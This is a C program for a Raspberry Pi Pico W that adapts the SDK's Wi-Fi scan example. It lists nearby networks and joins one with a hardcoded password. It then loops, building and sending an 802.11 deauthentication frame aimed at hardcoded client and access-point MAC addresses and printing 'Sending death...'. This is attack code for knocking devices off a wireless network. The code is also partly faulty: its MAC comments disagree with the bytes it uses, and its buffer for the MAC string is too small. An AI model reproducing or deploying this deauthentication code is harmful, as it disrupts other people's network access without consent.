#include <stdio.h>
#include "pico/stdlib.h"
#include "pico/cyw43_arch.h"

static int scan_result(void *env, const cyw43_ev_scan_result_t *result)
{
    if (result)
    {
        printf("ssid: %-32s rssi: %4d chan: %3d mac: %02x:%02x:%02x:%02x:%02x:%02x sec: %u\n",
               result->ssid, result->rssi, result->channel,
               result->bssid[0], result->bssid[1], result->bssid[2], result->bssid[3], result->bssid[4], result->bssid[5],
               result->auth_mode);
    }
    return 0;
}

#include "hardware/vreg.h"
#include "hardware/clocks.h"

int main()
{
    stdio_init_all();
    sleep_ms(5000);
    if (cyw43_arch_init())
    {
        printf("failed to initialise\n");
        return 1;
    }

    cyw43_arch_enable_sta_mode();

    absolute_time_t scan_time = nil_time;
    bool scan_in_progress = false;
    int linkStatus = 0;
    uint8_t mac[6];
    char *macStr = calloc(16, sizeof(char));
    while (true)
    {
        if (absolute_time_diff_us(get_absolute_time(), scan_time) < 0)
        {
            if (!scan_in_progress)
            {
                cyw43_wifi_scan_options_t scan_options = {0};
                int macErr = cyw43_wifi_get_mac(&cyw43_state, CYW43_ITF_STA, mac);
                if (macErr == 0)
                {
                    for (uint8_t i = 0; i < 6; i++)
                    {
                        if (mac[i] < 16)
                        {
                            sprintf(&macStr[i * 2], "0%X", mac[i]);
                        }
                        else
                        {
                            sprintf(&macStr[i * 2], "%X", mac[i]);
                        }
                    }
                    macStr[13] = 0;
                    printf("mac: %s", macStr);
                }
                else
                {
                    printf("Failed to get mac address: %d\n", macErr);
                }
                int err = cyw43_wifi_scan(&cyw43_state, &scan_options, NULL, scan_result);
                if (err == 0)
                {
                    printf("\nPerforming wifi scan\n");
                    scan_in_progress = true;
                }
                else
                {
                    printf("Failed to start scan: %d\n", err);
                    scan_time = make_timeout_time_ms(10000); // wait 10s and scan again
                }
            }
            else if (!cyw43_wifi_scan_active(&cyw43_state))
            {
                scan_time = make_timeout_time_ms(10000); // wait 10s and scan again
                scan_in_progress = false;
            }

            linkStatus = cyw43_wifi_link_status(&cyw43_state, CYW43_ITF_STA);
            printf("Current link status: %d\n", linkStatus);
            if (linkStatus != CYW43_LINK_JOIN)
            {
                printf("Attempting to join wifi...\n");
                char ssid[4] = "cat";
                char password[10] = "catcatcat";
                printf("SSID: %s\n", ssid);
                if (cyw43_arch_wifi_connect_timeout_ms(ssid, password, CYW43_AUTH_WPA2_AES_PSK, 10000))
                {
                    printf("Failed to joined network.\n");
                }
                else
                {
                    printf("Succesfully joined network.\n");
                }
            }
            else
            {
                uint8_t deauthPacket[26] = {
                    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
                    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
                    /*  4 - 9  */ 0xBE, 0xFE, 0x05, 0x27, 0x22, 0xA2, // reciever (target) 0xEA, 0x28, 0x58, 0x73, 0x22, 0xC3
                    /* 10 - 15 */ 0xC3, 0x22, 0x73, 0x58, 0x28, 0xEA, // source (ap)0xEA, 0x17, 0x93, 0xC2, 0x8D, 0x3C
                    /* 16 - 21 */ 0xC3, 0x22, 0x73, 0x58, 0x28, 0xEA, // BSSID (ap)0xA2, 0x22, 0x27, 0x05, 0xFE, 0xBE
                    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
                    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
                };
                printf("Sending death...\n");
                int dErr = cyw43_send_ethernet(&cyw43_state, CYW43_ITF_STA, sizeof(deauthPacket), deauthPacket, false);
                printf("Result: %d\n", dErr);
            }
        }
        // the following #ifdef is only here so this same example can be used in multiple modes;
        // you do not need it in your code
#if PICO_CYW43_ARCH_POLL
        // if you are using pico_cyw43_arch_poll, then you must poll periodically from your
        // main loop (not from a timer) to check for Wi-Fi driver or lwIP work that needs to be done.
        cyw43_arch_poll();
        // you can poll as often as you like, however if you have nothing else to do you can
        // choose to sleep until either a specified time, or cyw43_arch_poll() has work to do:
        cyw43_arch_wait_for_work_until(scan_time);
#else
        // if you are not using pico_cyw43_arch_poll, then WiFI driver and lwIP work
        // is done via interrupt in the background. This sleep is just an example of some (blocking)
        // work you might be doing.
        sleep_ms(1000);
#endif
    }

    cyw43_arch_deinit();
    return 0;
}
